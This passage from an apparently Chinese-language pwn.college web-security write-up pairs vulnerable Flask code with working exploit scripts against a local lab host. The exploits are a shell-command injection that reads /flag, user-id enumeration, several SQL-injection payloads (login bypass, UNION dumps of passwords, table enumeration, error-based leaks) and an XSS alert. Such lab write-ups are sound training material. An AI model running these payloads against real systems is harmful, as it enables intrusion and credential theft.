punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"TZ=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>timezone<span class="token punctuation">&#125;</span></span><span class="token string"> date"</span></span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"latin"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>利用脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># level 2</span><span class="token comment"># pwn.college&#123;Qf_-LrgHRo8RcQtJZnootYJZt5J.dhDOzMDL0czNxEzW&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"host"</span><span class="token punctuation">:</span><span class="token string">'challenge.localhost'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>time_zone <span class="token operator">=</span> <span class="token string">"; cat /flag ;"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://challenge.localhost:80/'</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"timezone"</span><span class="token punctuation">:</span> time_zone<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>源码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS users AS "</span>                <span class="token string">'SELECT "flag" AS username, ? as password'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> username<span class="token punctuation">,</span> <span class="token string">"Missing `username` form"</span>        <span class="token keyword">assert</span> password<span class="token punctuation">,</span> <span class="token string">"Missing `password` form"</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"SELECT rowid, * FROM users WHERE username = ? AND password = ?"</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> user<span class="token punctuation">,</span> <span class="token string">"Invalid `username` or `password`"</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>path<span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">"rowid"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"user"</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>        user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE rowid = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user<span class="token punctuation">:</span>            username <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">"flag"</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">!\n"</span></span>    <span class="token keyword">return</span> form<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pwn<span class="token punctuation">.</span>college<span class="token punctuation">&#123;</span>YZT44ipzNzZZPUSIPj4X76UIKcy<span class="token punctuation">.</span>dlDOzMDL0czNxEzW<span class="token punctuation">&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"host"</span><span class="token punctuation">:</span><span class="token string">'challenge.localhost'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> i    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://challenge.localhost:80/'</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"user"</span><span class="token punctuation">:</span> user<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>这一关用到了session，你没有办法直接更新session。因为session是存储到服务器端的，但是这一关username 和password被拼接在字符串中了。所以可以直接利用sql注入。<br>源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS users AS "</span>                <span class="token string">'SELECT "flag" AS username, ? as password'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> username<span class="token punctuation">,</span> <span class="token string">"Missing `username` form"</span>        <span class="token keyword">assert</span> password<span class="token punctuation">,</span> <span class="token string">"Missing `password` form"</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'SELECT rowid, * FROM users WHERE username = "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">" AND password = "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> user<span class="token punctuation">,</span> <span class="token string">"Invalid `username` or `password`"</span>        session<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">"rowid"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>path<span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE rowid = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user<span class="token punctuation">:</span>            username <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">"flag"</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">!\n"</span></span>    <span class="token keyword">return</span> form<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">login_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'flag'</span><span class="token punctuation">,</span>    <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'" OR "1"="1'</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://challenge.localhost:80/'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>login_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>存在SQL注入点–可以构造sql语句<br>  <code>SELECT username FROM users WHERE username LIKE &#39;%&#39; UNION SELECT username || &#39; - &#39; || password FROM users WHERE &#39;1&#39;=&#39;1&#39;--</code></p><p>源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS users AS "</span>                <span class="token string">'SELECT "flag" AS username, ? AS password'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    query <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"query"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">)</span>    users <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'SELECT username FROM users WHERE username LIKE "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>query<span class="token punctuation">&#125;</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 拼接字符串</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\n'</span></span> <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parsequery <span class="token operator">=</span> <span class="token string">"flag \"  UNION SELECT username || ' - ' || password FROM users WHERE '1'='1'-- \""</span><span class="token comment"># query = "f%"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://challenge.localhost:80/'</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"query"</span><span class="token punctuation">:</span> query<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>hacker@web<span class="token operator">-</span>security<span class="token operator">~</span>level5<span class="token punctuation">:</span><span class="token operator">~</span>$ <span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>python <span class="token operator">/</span>home<span class="token operator">/</span>hacker<span class="token operator">/</span>Web<span class="token operator">/</span>level3<span class="token punctuation">.</span>pyflag <span class="token operator">-</span> pwn<span class="token punctuation">.</span>college<span class="token punctuation">&#123;</span>czX<span class="token operator">-</span>TLFVwlqyikW9mfkA9La9Dd4<span class="token punctuation">.</span>dFTOzMDL0czNxEzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>依旧是存在sql注入点，这一关把users表名给hash了，我们不能直接通过上一关的sql注入，直接获得答案。</p><p>观察源码发现是sqlite数据库，我们首先可以通过sqlite查询所有自建表的名称，然后根据hash字符串的特点选择。</p><p>获得表名之后，再进行下一步的sql注入操作。 这里要注意一点。最后的<code>--</code>是为了注释掉没有闭合的双引号<code>&quot;</code></p><p>源码:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    table_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"table</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hash</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFFFFF</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"CREATE TABLE IF NOT EXISTS </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string"> AS "</span></span>                <span class="token string">'SELECT "flag" AS username, ? AS password'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    query <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"query"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">)</span>    users <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'SELECT username FROM </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string"> WHERE username LIKE "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>query<span class="token punctuation">&#125;</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\n'</span></span> <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用代码:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">query <span class="token operator">=</span> <span class="token string">"flag \"  UNION SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' --"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://challenge.localhost:80/'</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"query"</span><span class="token punctuation">:</span> query<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>query <span class="token operator">=</span> <span class="token string">"flag \"  UNION SELECT username || ' - ' || password FROM 'table6301237404136328429' WHERE '1'='1'-- \""</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://challenge.localhost:80/'</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"query"</span><span class="token punctuation">:</span> query<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># table6301237404136328429</span><span class="token comment"># flag - pwn.college&#123;8SaDDkYZvBuqJQ_N-4fk3MgZPfE.dJTOzMDL0czNxEzW&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>应该不是正确的解法，感觉正确的解法里面，我是看不到服务器端错误回显的。但是在浏览器中访问的时候，发现也能获取到错误回显。就先这样把。</p><p>理论上来讲，我应该把username字段更新为username-password的拼接字符串，这样会用到update语句，这样会变成同时运行select和update语句，而sqlite不允许这样。</p><p>我选择把<code>username-password</code>拼接以后的字段作为rowid，这样的话，flag会在报错中回显。</p><p>源码:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level7</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS users AS "</span>                <span class="token string">'SELECT "flag" AS username, ? as password'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> username<span class="token punctuation">,</span> <span class="token string">"Missing `username` form"</span>        <span class="token keyword">assert</span> password<span class="token punctuation">,</span> <span class="token string">"Missing `password` form"</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'SELECT rowid, * FROM users WHERE username = "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">" AND password = "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> user<span class="token punctuation">,</span> <span class="token string">"Invalid `username` or `password`"</span>        session<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">"rowid"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>path<span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE rowid = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user<span class="token punctuation">:</span>            username <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">!\n"</span></span>    <span class="token keyword">return</span> form<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">login_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'w'</span><span class="token punctuation">,</span>    <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">" \" AND '1'='0'UNION SELECT (SELECT username || ' - ' || password FROM users WHERE username='flag'),* FROM users WHER username='flag' --"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://challenge.localhost:80/'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>login_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"/usr/local/lib/python3.8/dist-packages/flask/app.py"</span><span class="token punctuation">,</span> line <span class="token number">880</span><span class="token punctuation">,</span> <span class="token keyword">in</span> full_dispatch_request    rv <span class="token operator">=</span> self<span class="token punctuation">.</span>dispatch_request<span class="token punctuation">(</span><span class="token punctuation">)</span>  File <span class="token string">"/usr/local/lib/python3.8/dist-packages/flask/app.py"</span><span class="token punctuation">,</span> line <span class="token number">865</span><span class="token punctuation">,</span> <span class="token keyword">in</span> dispatch_request    <span class="token keyword">return</span> self<span class="token punctuation">.</span>ensure_sync<span class="token punctuation">(</span>self<span class="token punctuation">.</span>view_functions<span class="token punctuation">[</span>rule<span class="token punctuation">.</span>endpoint<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">**</span>view_args<span class="token punctuation">)</span>  <span class="token comment"># type: ignore[no-any-return]</span>  File <span class="token string">"/challenge/run"</span><span class="token punctuation">,</span> line <span class="token number">671</span><span class="token punctuation">,</span> <span class="token keyword">in</span> catch_all    <span class="token keyword">return</span> challenge<span class="token punctuation">(</span><span class="token punctuation">)</span>  File <span class="token string">"/challenge/run"</span><span class="token punctuation">,</span> line <span class="token number">177</span><span class="token punctuation">,</span> <span class="token keyword">in</span> level7    session<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">"rowid"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ValueError<span class="token punctuation">:</span> invalid literal <span class="token keyword">for</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">with</span> base <span class="token number">10</span><span class="token punctuation">:</span> <span class="token string">'flag - pwn.college&#123;wTBGaZe76xiwOq7ylUDY0k3qlPK.dNTOzMDL0czNxEzW&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>我们需要对url传入一个地址，让其能弹出alter窗口。地址可以设定为echo，然后利用html(echo)，将echo设定为<code>&lt;script type=&#39;text/javascript&#39;&gt;alert(&#39;This is an alert&#39;);&lt;/script&gt;</code>即可。</p><p>那为什么说是跨站脚本呢，意思大概是，我可以通过你提供的服务，访问一个我设定的有漏洞的网站。这样有可能泄露一些不应该暴露的逻辑。</p><p>源码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level8</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/echo"</span><span class="token punctuation">:</span>        echo <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"echo"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> echo<span class="token punctuation">,</span> <span class="token string">"Missing `echo` argument"</span>        <span class="token keyword">return</span> html<span class="token punctuation">(</span>echo<span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/visit"</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> url<span class="token punctuation">,</span> <span class="token string">"Missing `url` argument"</span>        url_arg_parsed <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">assert</span> url_arg_parsed<span class="token punctuation">.</span>hostname <span class="token operator">==</span> challenge_host<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Invalid `url`, hostname should be `</span><span class="token interpolation"><span class="token punctuation">&#123;</span>challenge_host<span class="token punctuation">&#125;</span></span><span class="token string">`"</span></span>        <span class="token keyword">with</span> run_browser<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> browser<span class="token punctuation">:</span>            browser<span class="token 